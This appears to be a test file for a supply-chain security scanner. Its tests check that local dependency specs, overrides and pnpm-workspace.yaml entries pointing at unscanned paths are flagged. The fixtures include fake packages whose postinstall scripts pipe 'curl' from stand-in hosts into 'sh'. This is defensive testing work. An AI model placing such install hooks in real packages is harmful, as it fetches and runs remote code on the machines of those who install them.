/**
 * Local dependency specs a package manager installs, and runs the install
 * scripts of, from somewhere the scan does not read (WS-SC-900); and the scan
 * surviving a file that yields 100,000+ findings.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, symlinkSync, truncateSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { basename, dirname, join } from "node:path";
import { scanDirectory } from "../src/scan.js";
import { checkLifecycle, checkPnpmWorkspace } from "../src/checks/lifecycle.js";
import { testCtx } from "./helpers.js";

function project(files: Record<string, string>, links: Record<string, string> = {}): string {
  const d = mkdtempSync(join(tmpdir(), "ws-local-"));
  for (const [p, c] of Object.entries(files)) {
    mkdirSync(dirname(join(d, p)), { recursive: true });
    writeFileSync(join(d, p), c);
  }
  for (const [p, target] of Object.entries(links)) {
    mkdirSync(dirname(join(d, p)), { recursive: true });
    symlinkSync(target, join(d, p));
  }
  return d;
}

const EVIL_PKG = JSON.stringify({ name: "evil", version: "1.0.0", scripts: { postinstall: "curl -s https://a.invalid/x | sh" } });
const lifecycle = (pkg: object, file = "package.json") => checkLifecycle(file, JSON.stringify(pkg), testCtx());
const label = (key: string): string => key.replace(/=[0-9a-f]{32}$/, "").replace(/^not-checked [0-9a-f]{32}$/, "not-checked");
const unchecked = (fs: { ruleId: string; key: string; file?: string }[]) => fs.filter((f) => f.ruleId === "WS-SC-900").map((f) => `${f.file} ${label(f.key)}`).sort();

test("local specs: the fingerprint covers the whole spec, so a baselined tarball cannot be swapped for a hidden path", () => {
  const fp = (spec: string) => lifecycle({ dependencies: { vend: spec } }).map((f) => f.fingerprint);
  const tarball = fp("file:./vendor/vend-1.0.0.tgz");
  assert.equal(tarball.length, 1);
  assert.notDeepEqual(fp("file:./node_modules/.cache/evil"), tarball);
  assert.notDeepEqual(fp("file:./vendor/vend-1.0.1.tgz"), tarball);
  assert.deepEqual(fp("file:./vendor/vend-1.0.0.tgz"), tarball, "and stays stable while nothing changes");
});

test("local specs: names and override paths that share their first 60 characters keep separate fingerprints", () => {
  const p = "p".repeat(60);
  const overrides = lifecycle({ overrides: { [`${p}benign`]: "file:./patches/x", [`${p}evil`]: "file:./node_modules/.cache/evil" } });
  assert.equal(new Set(overrides.map((f) => f.fingerprint)).size, 2);
  const nested = lifecycle({ overrides: { a: { [`${p}1`]: "./x", [`${p}2`]: "./x" } } });
  assert.equal(new Set(nested.map((f) => f.fingerprint)).size, 2, "same spec under different full paths");
  const deps = lifecycle({ dependencies: { [`${p}1`]: "./node_modules/x", [`${p}2`]: "./node_modules/x" } });
  assert.equal(new Set(deps.map((f) => f.fingerprint)).size, 2);
  assert.ok(deps.every((f) => f.message.length < 400), "labels stay short");
  const d = project({ "package.json": JSON.stringify({ overrides: { [`${p}benign`]: "file:./patches/x", [`${p}evil`]: "file:./node_modules/.cache/evil" } }) });
  assert.equal(scanDirectory(d, testCtx(), { nodeModules: false }).findings.filter((f) => f.ruleId === "WS-SC-900").length, 2, "dedupe keeps both");
});

test("local specs: Yarn resolutions and pnpm.overrides are read like dependencies, whatever the key's pattern", () => {
  // Yarn 1.22.22 and 4.10.3 and pnpm 9.0.0 each ran node_modules/.cache/evil's postinstall through these fields.
  const pkg = {
    dependencies: { a: "file:./vendor/a" },
    resolutions: { evil: "file:./node_modules/.cache/evil", "a/**/glob": "file:./node_modules/.cache/evil", ok: "file:./vendor/ok", reg: "1.0.0", gh: "u/r" },
    pnpm: { overrides: { "evil@1>x": "file:./node_modules/.cache/evil", ok: "file:./vendor/ok", tgz: "./e.tgz" } },
  };
  assert.deepEqual(unchecked(lifecycle(pkg)), ["package.json pnpm.overrides:evil@1>x", "package.json pnpm.overrides:tgz", "package.json resolutions:a/**/glob", "package.json resolutions:evil"]);
  assert.deepEqual(lifecycle({ resolutions: "x", pnpm: "y" }), [], "fields of the wrong type are skipped");
});

test("local specs: a file: dependency into a baseline-ignored path is high, like a symlink there", () => {
  const files = {
    "package.json": JSON.stringify({ dependencies: { evil: "file:./test/fixtures/evil", upper: "file:./TEST/Fixtures/evil", sib: "file:./test/fixturesx/ok" } }),
    "packages/a/package.json": JSON.stringify({ dependencies: { up: "../../test/fixtures/evil" } }),
    "test/fixtures/evil/package.json": EVIL_PKG,
    "test/fixturesx/ok/package.json": "{}",
  };
  const d = project(files);
  const ignoring = scanDirectory(d, testCtx(), { nodeModules: false, ignorePrefixes: ["test/fixtures"] });
  assert.deepEqual(unchecked(ignoring.findings), ["package.json dependencies:evil", "package.json dependencies:upper", "packages/a/package.json dependencies:up"]);
  assert.match(ignoring.findings[0]?.message ?? "", /in a path the baseline excludes from the scan/);
  const plain = scanDirectory(d, testCtx(), { nodeModules: false });
  assert.deepEqual(unchecked(plain.findings), [], "without the ignore prefix the target is scanned");
  assert.deepEqual(plain.findings.filter((f) => f.ruleId === "WS-LC-002").map((f) => f.file), ["test/fixtures/evil/package.json"]);
});

test("local specs: a path into an ignored directory is caught however it is spelled: climbing out and back, absolute, file://localhost, ~", () => {
  // npm 10.9.2 ran the postinstall of a package reached through file:../<repo>/test/fixtures/evil.
  const d = project({ "test/fixtures/evil/package.json": EVIL_PKG, "test/ok/package.json": "{}" });
  const name = basename(d);
  const dependencies = {
    climb: `file:../${name}/test/fixtures/evil`,
    climbUpper: `../${name.toUpperCase()}/TEST/fixtures/evil`,
    abs: `file:${d}/test/fixtures/evil`, // d is under a symlink on macOS (/var -> /private/var), so only the real path compares
    host: `file://localhost${d}/test/fixtures/evil`,
    hostAsPath: `file:/${d}/test/fixtures/evil`, // file://var/... is read as file:///var/...
    slashDots: `file:/../${name}/test/fixtures/evil`,
    home: `file:~/${name}/test/fixtures/evil`,
    sibling: `file:../${name}x/test/fixtures/evil`,
    ok: `file:../${name}/test/ok`,
  };
  writeFileSync(join(d, "package.json"), JSON.stringify({ dependencies }));
  const home = process.env.HOME;
  process.env.HOME = dirname(d);
  try {
    const r = scanDirectory(d, testCtx(), { nodeModules: false, ignorePrefixes: ["test/fixtures"] });
    assert.deepEqual(unchecked(r.findings), ["abs", "climb", "climbUpper", "home", "host", "hostAsPath", "slashDots"].map((k) => `package.json dependencies:${k}`));
  } finally {
    process.env.HOME = home;
  }
});

test("local specs: git+file: specs are high, since wormsign cannot read a repository's packed objects", () => {
  // npm 10.9.2 ran the postinstall of a git+file:///abs/path dependency.
  const pkg = {
    dependencies: { g: "git+file:///home/runner/work/r/r/node_modules/.cache/evil", up: "GIT+FILE:///tmp/x.git", https: "git+https://github.com/u/r.git", ssh: "git+ssh://git@github.com/u/r.git" },
    overrides: { o: "git+file:///tmp/y.git" },
  };
  assert.deepEqual(unchecked(lifecycle(pkg)), ["package.json dependencies:g", "package.json dependencies:up", "package.json overrides:o"]);
});

test("local specs: 120,000 local overrides are 50 findings and one summary, and the manifest's other findings survive", () => {
  const n = 120000;
  const overrides = Object.fromEntries(Array.from({ length: n }, (_, i) => [`k${i}`, "./x"]));
  const pkg = { scripts: { postinstall: "curl https://e.invalid/x | sh" }, overrides };
  const r = scanDirectory(project({ "package.json": JSON.stringify(pkg) }), testCtx(), { nodeModules: false });
  assert.ok(r.findings.some((f) => f.ruleId === "WS-LC-002"));
  const sc = r.findings.filter((f) => f.ruleId === "WS-SC-900");
  assert.equal(sc.length, 51);
  assert.match(sc[50]?.message ?? "", /^119950 more local dependency specs/);
  assert.equal(sc[50]?.severity, "high");
  // The summary's fingerprint covers every collapsed entry, so a baseline for it does not hide one more.
  const more = lifecycle({ overrides: { ...overrides, extra: "./node_modules/e" } }).at(-1);
  assert.notEqual(more?.fingerprint, sc[50]?.fingerprint);
});

test("scan: a file that yields 120,000 findings is reported, not lost to a stack overflow", () => {
  const n = 120000;
  const packages: Record<string, object> = { "": {} };
  for (let i = 0; i < n; i++) packages[`node_modules/p${i}`] = { version: "1.0.0", resolved: `https://mirror.invalid/p${i}.tgz`, integrity: "sha512-AAAA" };
  const r = scanDirectory(project({ "package-lock.json": JSON.stringify({ lockfileVersion: 3, packages }) }), testCtx(), { nodeModules: false });
  assert.equal(r.findings.filter((f) => f.ruleId === "WS-LK-002").length, n);
});

test("scan: a symlink named like a payload is reported by name and noted as not hashed, never followed", () => {
  const outside = project({ "x.js": "// anything" });
  const d = project({}, { "wormsign_marker_loader.js": join(outside, "x.js"), "lib/bundle.js": join(outside, "x.js") });
  const r = scanDirectory(d, testCtx(), { nodeModules: false });
  assert.deepEqual(r.findings.map((f) => `${f.ruleId} ${f.file} ${f.severity}`), ["WS-FS-002 wormsign_marker_loader.js high"]);
  assert.ok(r.notes.includes("not hashed wormsign_marker_loader.js: it is a symlink"), r.notes.join("\n"));
  assert.ok(r.notes.includes("not hashed lib/bundle.js: it is a symlink"), "an 'info' name gets the note, not a finding");
});

test("scan: a payload-named file too large to hash is a note, and its name-only finding still fires", () => {
  const d = project({ "wormsign_marker_loader.js": "x", "small/wormsign_marker_loader.js": "x" });
  truncateSync(join(d, "wormsign_marker_loader.js"), 64 * 1024 * 1024 + 1); // sparse: cheap to create
  const r = scanDirectory(d, testCtx(), { nodeModules: false });
  assert.deepEqual(r.notes.filter((n) => n.startsWith("not hashed")), ["not hashed wormsign_marker_loader.js: it is larger than 64 MiB"]);
  assert.deepEqual(r.findings.filter((f) => f.ruleId === "WS-FS-002").map((f) => f.file).sort(), ["small/wormsign_marker_loader.js", "wormsign_marker_loader.js"]);
});

test("local specs: a project directory named with #, ?, % or a space still resolves each spec to where it lands", () => {
  // The base URL is percent-encoded: a raw `file://${dir}/` cut `a#b` and `q?r` short and decoded `caf%C3%A9` to `café`.
  const parent = mkdtempSync(join(tmpdir(), "ws-local-dirs-"));
  for (const name of ["x a#b", "x q?r", "x caf%C3%A9", "x 100%", "x my repo"]) {
    const d = join(parent, name);
    for (const sub of ["vendor/p", "test/fx"]) mkdirSync(join(d, sub), { recursive: true });
    writeFileSync(join(d, "package.json"), JSON.stringify({ dependencies: { p: "file:./vendor/p", q: "file:./test/fx" } }));
    const r = scanDirectory(d, testCtx(), { nodeModules: false, ignorePrefixes: ["test/fx"] });
    assert.deepEqual(unchecked(r.findings), ["package.json dependencies:q"], name);
  }
});

test("local specs: pnpm-workspace.yaml overrides, which pnpm 11 reads instead of pnpm.overrides, are checked", () => {
  // pnpm 11.16.0 installed `evil: "file:./node_modules/.cache/evil"` from this file and ran its postinstall; it ignored pnpm.overrides.
  const ws = (yaml: string, file = "pnpm-workspace.yaml") => unchecked(scanDirectory(project({ "package.json": "{}", [file]: yaml }), testCtx(), { nodeModules: false }).findings);
  const block = [
    "packages:",
    "  - 'packages/*'",
    "catalog: { react: ^18 }",
    "overrides: # pinned",
    '  evil: "file:./node_modules/.cache/evil"',
    "  'a>b': file:./.git/x # a comment",
    "  ok: file:./vendor/ok",
    "  reg: ^1.2.3",
    "  gone: '-'",
    "onlyBuiltDependencies: [esbuild,",
    "  sharp",
    "]",
  ].join("\n");
  assert.deepEqual(ws(block), ["pnpm-workspace.yaml pnpm-workspace overrides:a>b", "pnpm-workspace.yaml pnpm-workspace overrides:evil"]);
  assert.deepEqual(ws(block, "pkg/pnpm-workspace.yaml"), ["pkg/pnpm-workspace.yaml pnpm-workspace overrides:a>b", "pkg/pnpm-workspace.yaml pnpm-workspace overrides:evil"]);
  assert.deepEqual(ws("overrides:\n  ok: file:./vendor/ok\npackages: ['a/*']\n"), []);
  assert.deepEqual(ws("overrides: {}\n"), []);
  const unreadable = [
    'overrides: {evil: "file:./node_modules/.cache/evil"}',
    '"overr\\x69des":\n  evil: file:./node_modules/x',
    "  overrides:\n    evil: file:./node_modules/x",
    'overrides:\n  evil: "node\\x5fmodules"',
    "overrides:\n  evil:\n    file:./node_modules/x",
    "overrides:\n  a: x\n    b: file:./node_modules/x",
    "base: &b\n  evil: file:./node_modules/x\noverrides:\n  <<: *b",
    "overrides:\n  a: x\noverrides:\n  b: y",
    "<<: *b",
    // pnpm 11.16 installed a's override from this flow map (resolution directory node_modules/.cache/a).
    'overrides:\n  {"a":file:./node_modules/.cache/a, b: x}\n',
    "overrides:\n  - a: file:./node_modules/x",
  ];
  for (const yaml of unreadable) assert.deepEqual(ws(yaml), ["pnpm-workspace.yaml not-checked"], yaml);
  const d = project({ "package.json": "{}", "node_modules/x/pnpm-workspace.yaml": "overrides: {" }, { "pnpm-workspace.yaml": join(tmpdir(), "nope.yaml") });
  assert.deepEqual(unchecked(scanDirectory(d, testCtx(), { nodeModules: true }).findings), ["pnpm-workspace.yaml not-checked"], "a link is not followed; node_modules is not a workspace root");
});

test("local specs: a block list written at its key's indentation is valid YAML, not an unreadable pnpm-workspace.yaml", () => {
  // `packages:\n- 'packages/*'` is a common style; it gave a false high at the default gate.
  const ws = (yaml: string) => unchecked(scanDirectory(project({ "package.json": "{}", "pnpm-workspace.yaml": yaml }), testCtx(), { nodeModules: false }).findings);
  assert.deepEqual(ws("packages:\n- 'packages/*'\n-\n"), []);
  assert.deepEqual(ws("packages:\n  - 'packages/*'\nonlyBuiltDependencies:\n- esbuild\noverrides:\n  evil: file:./node_modules/x\n"), ["pnpm-workspace.yaml pnpm-workspace overrides:evil"], "overrides after it are still read");
  for (const yaml of ["overrides:\n- evil: file:./node_modules/x\n", "- packages/*\n", "packages:\n-x: y\n"]) {
    assert.deepEqual(ws(yaml), ["pnpm-workspace.yaml not-checked"], yaml);
  }
});

test("local specs: a 200,000-character line in pnpm-workspace.yaml fails closed in linear time", () => {
  // Backtracking key regexes took 20 s on a 150,000-character line; a 2 MiB file would have taken an hour.
  const long = "x" + " ".repeat(200_000);
  for (const yaml of [long, `overrides:\n  ${long}`, `overrides:\n  a:b${" ".repeat(200_000)}`, `"a"${" ".repeat(200_000)}b`, `overrides:\n  a: "b"${" ".repeat(200_000)}c`]) {
    const t0 = performance.now();
    const f = checkPnpmWorkspace("pnpm-workspace.yaml", yaml, { root: tmpdir(), isIgnored: () => false });
    assert.ok(performance.now() - t0 < 500, `took ${Math.round(performance.now() - t0)} ms`);
    assert.deepEqual(f.map((x) => `${x.ruleId} ${x.severity}`), ["WS-SC-900 high"], yaml.slice(0, 20));
  }
});
